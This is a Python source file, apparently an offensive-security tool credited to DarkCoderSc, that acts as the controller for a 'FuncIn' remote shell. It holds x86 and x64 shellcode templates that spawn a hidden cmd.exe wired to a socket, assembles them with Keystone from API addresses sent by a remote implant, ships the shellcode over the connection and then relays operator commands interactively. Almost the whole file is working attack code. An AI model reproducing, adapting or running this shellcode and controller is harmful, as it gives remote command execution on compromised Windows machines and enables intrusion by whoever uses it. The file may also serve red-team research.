################################################################################
#                                                                              #
#                                                                              #
#                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  #
#                   https:#www.twitter.com/darkcodersc                        #
#                   https:#github.com/darkcodersc                             #
#                   License: Apache License 2.0                                #
#                                                                              #
#                                                                              #
################################################################################

import sys
import ctypes
import socket
import struct
import threading
from enum import Enum

from keystone import *

# CONFIGURATION 
SERVER_PORT = 2801
SERVER_ADDR = "127.0.0.1"

# WIN32 REQUIRED CONSTANTS
STARTF_USESTDHANDLES = 0x100
STARTF_USESHOWWINDOW = 0x1
SW_HIDE = 0x0
CREATE_NEW_CONSOLE = 0x10

# x86-32 Remote Shell FuncIn Shellcode Template
__FUNCIN_x32__REMOTE_SHELL = (
    """
          # Prepare Stack
          mov ebp, esp 
          sub esp, 0x4                                                      # TProcessInformation Variable

          # Prepare stack room for TStartupInfoA structure 
          mov edx, {} 
          sub esp, edx 

          # Zero-out memory region of our structure 
          mov edi, esp 
          mov ecx, edx 
          xor eax, eax 
          rep stosb    

          # Assign our Socket Fd to `esi` 
          mov esi, {} 

          # Setup our structure (Only required properties) 
          mov dword ptr [esp], edx                                          # Offset: 0x0 - TStartupInfoA.cb
                                                                            # Offset: 0x4 - TStartupInfoA.lpReserved
                                                                            # Offset: 0x8 - TStartupInfoA.lpDesktop
                                                                            # Offset: 0xc - TStartupInfoA.lpTitle
                                                                            # Offset: 0x10 - TStartupInfoA.dwX
                                                                            # Offset: 0x14 - TStartupInfoA.dwY
                                                                            # Offset: 0x18 - TStartupInfoA.dwXSize
                                                                            # Offset: 0x1c - TStartupInfoA.dwYSize
                                                                            # Offset: 0x20 - TStartupInfoA.dwXCountChars
                                                                            # Offset: 0x24 - TStartupInfoA.dwYCountChars
                                                                            # Offset: 0x28 - TStartupInfoA.dwFillAttribute
          mov dword ptr [esp + 0x2c], {}                                    # Offset: 0x2c - TStartupInfoA.dwFlags
          mov word ptr [esp + 0x30], {}                                     # Offset: 0x30 - TStartupInfoA.wShowWindow
                                                                            # Offset: 0x32 - TStartupInfoA.cbReserved2
                                                                            # Offset: 0x34 - TStartupInfoA.lpReserved2
          mov dword ptr [esp + 0x38], esi                                   # Offset: 0x38 - TStartupInfoA.hStdInput
          mov dword ptr [esp + 0x3c], esi                                   # Offset: 0x3c - TStartupInfoA.hStdOutput
          mov dword ptr [esp + 0x40], esi                                   # Offset: 0x40 - TStartupInfoA.hStdErrror

          mov esi, esp                                                      # Save TStartupInfoA structure to `esi`

          # Prepare stack room for TProcessInformation structure 
          sub esp, {} 
          mov [ebp-0x4], esp                                                # Save TProcessInformation structure to stack variable

          # Push `cmd.exe` to stack, for NT AUTHORITY/SYSTEM, full path is required
          push 0x00657865 
          push 0x2E646D63 
          mov edx, esp                                                      # Save Application Name to `edx`

          # Call CreateProcessA 
          xor eax, eax 

          push [ebp-0x4]                                                    # lpProcessInformation
          push esi                                                          # lpStartupInfo
          push eax                                                          # lpCurrentDirectory
          push eax                                                          # lpEnvironment
          push {}                                                           # dwCreationFlags
          push 0x1                                                          # bInheritHandles
          push eax                                                          # lpThreadAttributes
          push eax                                                          # lpProcessAttributes
          push edx                                                          # lpCommandLine
          push eax                                                          # lpApplicationName
          mov eax, {} 
          call eax                                                          # CreateProcessA

          # Call WaitForSingleObject 
          xor eax, eax       
          dec eax                                                           # 0xFFFFFFFF (INFINITE)
          push eax                                                          # dwMilliseconds
          mov eax, [ebp-0x4]                                                # TProcessInformation->hProcess (Offset: 0x0)
          push [eax]         
          mov eax, {}      
          call eax                                                          # WaitForSingleObject

          # Call ExitProcess (Gracefully Exit) 
          xor eax, eax  
          push eax                                                          # uExitCode
          mov eax, {} 
          call eax                                                          # ExitProcess
    """
)

# x86-64 Remote Shell FuncIn Shellcode Template
__FUNCIN_x64__REMOTE_SHELL = (
    """
        # Prepare stack room for TStartupInfoA structure 
        mov r15, {}
        sub rsp, r15

        # Zero-out memory region of our structure 
        mov rdi, rsp
        mov rcx, r15
        xor rax, rax
        rep stosb

        # Assign our Socket Fd to `r14` 
        mov r14, {}

        # Setup our structure (Only required properties) 
        mov qword ptr [rsp], r15                                         # Offset: 0x0 - TStartupInfoA.cb
                                                                         # Offset: 0x8 - TStartupInfoA.lpReserved
                                                                         # Offset: 0x10 - TStartupInfoA.lpDesktop
                                                                         # Offset: 0x18 - TStartupInfoA.lpTitle
                                                                         # Offset: 0x20 - TStartupInfoA.dwX
                                                                         # Offset: 0x24 - TStartupInfoA.dwY
                                                                         # Offset: 0x28 - TStartupInfoA.dwXSize
                                                                         # Offset: 0x2c - TStartupInfoA.dwYSize
                                                                         # Offset: 0x30 - TStartupInfoA.dwXCountChars
                                                                         # Offset: 0x34 - TStartupInfoA.dwYCountChars
                                                                         # Offset: 0x38 - TStartupInfoA.dwFillAttribute
        mov dword ptr [rsp + 0x3c], {}                                   # Offset: 0x3c - TStartupInfoA.dwFlags
        mov word ptr [rsp + 0x40], {}                                    # Offset: 0x40 - TStartupInfoA.wShowWindow
                                                                         # Offset: 0x42 - TStartupInfoA.cbReserved2
                                                                         # Offset: 0x48 - TStartupInfoA.lpReserved2
        mov qword ptr [rsp + 0x50], r14                                  # Offset: 0x50 - TStartupInfoA.hStdInput
        mov qword ptr [rsp + 0x58], r14                                  # Offset: 0x58 - TStartupInfoA.hStdOutput
        mov qword ptr [rsp + 0x60], r14                                  # Offset: 0x60 - TStartupInfoA.hStdErrror

        mov r14, rsp                                                     # Save TStartupInfoA structure to `r14`

        # Prepare stack room for TProcessInformation structure 
        sub rsp, {}
        mov r15, rsp                                                     # Save TProcessInformation structure to `r15`

        # Push `cmd.exe` to stack, for NT AUTHORITY/SYSTEM, full path is required
        mov rax, 0x006578652E646D63
        push rax
        mov r13, rsp                                                     # Save Application Name to `r13`

        # Prepare CreateProcessA Call 
        xor rax, rax

        mov rcx, rax                                                     # lpApplicationName
        mov rdx, r13                                                     # lpCommandLine
        xor r8, r8                                                       # lpProcessAttributes
        xor r9, r9                                                       # lpThreadAttributes

        push r15                                                         # lpProcessInformation
        push r14                                                         # lpStartupInfo
        push rax                                                         # lpCurrentDirectory
        push rax                                                         # lpEnvironment
        xor rbx, rbx
        mov bl, {}
        push rbx                                                         # dwCreationFlags
        inc rax
        push rax                                                         # bInheritHandles
        dec rax

        # Shadow Space 
        push rax
        push rax
        push rax
        push rax

        # Call CreateProcess 
        mov rax, {}
        call rax

        # Call WaitForSingleObject 
        mov rcx, r15       
        mov rcx, [rcx]     
        xor rdx, rdx     
        dec rdx                                                          # dwMilliseconds->0xFFFFFFFF (INFINITE)
        mov rax, {}     
        call rax                                                         # WaitForSingleObject

        # Call ExitProcess (Gracefully Exit) 
        xor rcx, rcx                                                     # uExitCode
        mov rax, {}
        call rax                                                         # ExitProcess
    """
)

class FuncInHeader(ctypes.Structure):
    _fields_ = [
        ("Architecture", ctypes.c_byte),
    ]


class FuncInRemoteShellInformation(ctypes.Structure):
    _fields_ = [
        ("Header", FuncInHeader),
        ("StartupInformationLen", ctypes.c_uint32),
        ("ProcessInformationLen", ctypes.c_uint32),
        ("SocketFd", ctypes.c_uint64),
        ("__WaitForSingleObject", ctypes.c_uint64),
        ("__CreateProcessA", ctypes.c_uint64),
        ("__ExitThread", ctypes.c_uint64),
    ]


def stdout_handler(s):
        while True:
            try:
                buf = s.recv(1024)
            except:
                break
            
            if not buf:
                break
            
            sys.stdout.buffer.write(buf)

            sys.stdout.flush()



if __name__ == "__main__":
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_ADDR, SERVER_PORT))    

        data = s.recv(ctypes.sizeof(FuncInRemoteShellInformation))

        FuncIn_RemoteShell_Information = FuncInRemoteShellInformation.from_buffer_copy(data)

        KS_ASM_ARCH = KS_ARCH_X86
        KS_ASM_MODE = None
        FUNCIN_TEMPLATE = None

        if (FuncIn_RemoteShell_Information.Header.Architecture == 0):
            KS_ASM_MODE = KS_MODE_32
            FUNCIN_TEMPLATE = __FUNCIN_x32__REMOTE_SHELL
        elif (FuncIn_RemoteShell_Information.Header.Architecture == 1):
            KS_ASM_MODE = KS_MODE_64
            FUNCIN_TEMPLATE = __FUNCIN_x64__REMOTE_SHELL
        else:
            raise Exception("Unsupported Architecture.")
        
        engine = Ks(KS_ASM_ARCH, KS_ASM_MODE)

        shellcode, _ = engine.asm(FUNCIN_TEMPLATE.format(
            hex(FuncIn_RemoteShell_Information.StartupInformationLen),
            hex(FuncIn_RemoteShell_Information.SocketFd),
            hex(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW),
            hex(SW_HIDE),
            hex(FuncIn_RemoteShell_Information.ProcessInformationLen),
            hex(CREATE_NEW_CONSOLE),
            hex(FuncIn_RemoteShell_Information.__CreateProcessA),
            hex(FuncIn_RemoteShell_Information.__WaitForSingleObject),
            hex(FuncIn_RemoteShell_Information.__ExitThread),
        ))

        shellcode_size_data = struct.pack("<q", len(shellcode))

        s.sendall(shellcode_size_data)

        s.sendall(bytes(shellcode))        

        try:
            stdout_thread = threading.Thread(target=stdout_handler, args=(s,))
            stdout_thread.start()

            do_exit = False
            while True:
                command = input()
                if (command.lower() == "exit"):
                    do_exit = True

                command += "\r\n"

                s.sendall(command.encode("ascii"))

                if do_exit:
                    break

        except KeyboardInterrupt:
            s.close()
        
        stdout_thread.join()




    